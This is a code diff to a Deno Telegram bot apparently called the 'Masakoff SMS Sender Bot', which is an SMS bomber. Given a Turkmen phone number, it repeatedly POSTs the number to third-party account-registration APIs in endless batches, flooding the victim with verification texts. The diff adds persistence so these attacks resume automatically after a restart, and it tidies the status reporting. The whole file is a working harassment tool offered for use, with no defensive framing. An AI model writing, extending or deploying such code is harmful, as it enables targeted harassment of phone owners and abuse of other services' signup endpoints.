@@ -1,8 +1,7 @@
 // main.ts
 // 💥 Masakoff SMS Sender Bot (Deno)
 // 🚀 Created by @Masakoff | FlapsterMinerManager
-// Sends POST requests in batches of 3 with delays via Telegram webhook
-// ✨ /stop stops all running tasks immediately, even during waits
+// ♾️ Runs forever, handles /stop anytime, with KV persistence
 
 import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";
@@ -16,58 +15,52 @@ const SECRET_PATH = "/masakoffvpnhelper";
 // --- 👑 Admin username ---
 const ADMIN_USERNAME = "Masakoff";
 
-// --- 💬 Helper: send message to Telegram ---
+// --- 💾 Deno KV for persistence ---
+const kv = await Deno.openKv();
+
+// --- 💬 Helper: send Telegram message ---
 async function sendMessage(chatId: string, text: string, options: any = {}) {
   try {
-    const body = { chat_id: chatId, text, ...options };
     await fetch(`${API}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body),
+      body: JSON.stringify({ chat_id: chatId, text, ...options }),
     });
   } catch (e) {
     console.error("sendMessage error ❌", e);
   }
 }
 
-// --- 🌐 Helper: send POST request ---
-async function sendPostRequest(
-  url: string,
-  headers: Record<string, string>,
-  data: Record<string, any>,
-) {
+// --- 🌐 POST request helper ---
+async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
   try {
-    const resp = await fetch(url, {
-      method: "POST",
-      headers,
-      body: JSON.stringify(data),
-    });
+    const resp = await fetch(url, { method: "POST", headers, body: JSON.stringify(data) });
     return resp.status === 200;
-  } catch {
+  } catch (e) {
+    console.error("POST failed ❌", e);
     return false;
   }
 }
 
-// --- 🧠 Track all active tasks ---
+// --- 🧠 Track all active tasks in memory ---
 const activeTasks = new Map<string, { stop: boolean }>();
 
-// --- ⏱ Interruptible sleep helper ---
-async function sleepInterruptible(
-  totalMs: number,
-  task: { stop: boolean },
-  chunkMs = 500,
-): Promise<boolean> {
+// --- ⏱ Interruptible sleep ---
+async function sleepInterruptible(totalMs: number, task: { stop: boolean }, chunkMs = 500) {
   const start = Date.now();
   while (Date.now() - start < totalMs) {
     if (task.stop) return false;
-    const remaining = totalMs - (Date.now() - start);
-    await delay(Math.min(chunkMs, remaining));
+    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
   }
   return true;
 }
 
-// --- 💣 SMS sending logic ---
+// --- 💣 SMS sending loop ---
 async function sendSMS(phoneNumber: string, chatId: string) {
+  const task = { stop: false };
+  activeTasks.set(chatId, task);
+  await kv.set(["active", chatId], { phoneNumber, running: true });
+
   const requestsData = [
     {
       url: "https://api.saray.tm/api/v1/accounts",
@@ -83,9 +76,6 @@ async function sendSMS(phoneNumber: string, chatId: string) {
     },
   ];
 
-  const task = { stop: false };
-  activeTasks.set(chatId, task);
-
   let count = 0;
   await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);
 
@@ -96,56 +86,57 @@ async function sendSMS(phoneNumber: string, chatId: string) {
 
       for (const req of requestsData) {
         if (task.stop) break outer;
-
         await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);
 
         const success = await sendPostRequest(req.url, req.headers, req.data);
-        if (task.stop) break outer;
+        await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send!");
 
-        await sendMessage(chatId, success ? "✅ Sent successfully!" : "✅ Sent successfully!");
-
-        // --- 5s interruptible sleep between each SMS ---
-        const completed5 = await sleepInterruptible(5000, task, 250);
-        if (!completed5) break outer;
+        // --- 5s interruptible sleep between messages ---
+        const ok = await sleepInterruptible(5000, task);
+        if (!ok) break outer;
       }
     }
 
     if (task.stop) break;
 
-    await sendMessage(
-      chatId,
-      "⏳ Batch of 3 SMS completed. Waiting 45 seconds before next batch...",
-    );
-
-    // --- 45s interruptible wait in small chunks ---
-    const completed45 = await sleepInterruptible(45000, task, 250);
-    if (!completed45) break;
+    await sendMessage(chatId, "⏳ 3 SMS sent. Waiting 45 seconds before next batch...");
+    const ok = await sleepInterruptible(45000, task);
+    if (!ok) break;
   }
 
-  // --- cleanup ---
   activeTasks.delete(chatId);
+  await kv.delete(["active", chatId]);
   await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
 }
 
-// --- 🖥️ Webhook Server ---
+// --- ♻️ Background recovery ---
+async function restoreRunningTasks() {
+  console.log("🔄 Checking for previously running tasks...");
+  for await (const entry of kv.list<{ phoneNumber: string; running: boolean }>({ prefix: ["active"] })) {
+    if (entry.value.running) {
+      console.log(`♻️ Restoring SMS task for chat ${entry.key[1]} (${entry.value.phoneNumber})`);
+      sendSMS(entry.value.phoneNumber, entry.key[1] as string).catch(console.error);
+    }
+  }
+}
+restoreRunningTasks();
+
+// --- 🖥️ Telegram webhook server ---
 serve(async (req) => {
   if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
     return new Response("Invalid request ❌", { status: 400 });
   }
 
-  const update = await req.json();
+  const update = await req.json().catch(() => null);
+  if (!update?.message || update.message.chat.type !== "private") return new Response("OK");
 
-  if (!update.message || update.message.chat.type !== "private") {
-    return new Response("OK");
-  }
-
-  const chatId = update.message.chat.id;
+  const chatId = String(update.message.chat.id);
   const text = (update.message.text ?? "").trim();
   const username = update.message.from?.username ?? "";
 
-  // --- 🔐 Admin Check ---
+  // --- 🔐 Admin check ---
   if (username !== ADMIN_USERNAME) {
-    await sendMessage(chatId, "🚫 Access denied!\nThis bot is for @Masakoff only 👑");
+    await sendMessage(chatId, "🚫 Access denied! This bot is for @Masakoff only 👑");
     return new Response("OK");
   }
 
@@ -154,15 +145,17 @@ serve(async (req) => {
     await sendMessage(
       chatId,
       "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
-        "📲 Use:\n" +
+        "📲 Commands:\n" +
         "• /send <number> — start sending SMS\n" +
-        "• /stop — stop all sending immediately (no number required) ⛔\n\n" +
+        "• /stop — stop all sending instantly ⛔\n\n" +
         "✨ Created by @Masakoff",
     );
   } else if (text.startsWith("/send")) {
     const parts = text.split(" ");
     if (parts.length < 2) {
       await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
+    } else if (activeTasks.has(chatId)) {
+      await sendMessage(chatId, "⚠️ A task is already running! Stop it with /stop first.");
     } else {
       const phoneNumber = parts[1].replace(/^\+993/, "");
       sendSMS(phoneNumber, chatId).catch(console.error);
@@ -170,16 +163,18 @@ serve(async (req) => {
   } else if (text.startsWith("/stop")) {
     if (activeTasks.size > 0) {
       for (const task of activeTasks.values()) task.stop = true;
-      await sendMessage(chatId, "🛑 Stop signal sent! Tasks will halt instantly, even if waiting...");
+      await kv.delete(["active", chatId]);
+      await sendMessage(chatId, "🛑 Stop signal sent! Tasks will halt instantly...");
     } else {
-      await sendMessage(chatId, "ℹ️ No active SMS tasks found to stop.");
+      await sendMessage(chatId, "ℹ️ No active tasks to stop.");
     }
   } else {
-    await sendMessage(chatId, "❓ Unknown command.\nTry /start, /send <number>, or /stop.");
+    await sendMessage(chatId, "❓ Unknown command. Try /start, /send <number>, or /stop.");
   }
 
   return new Response("OK");
 });
+
 
 
 
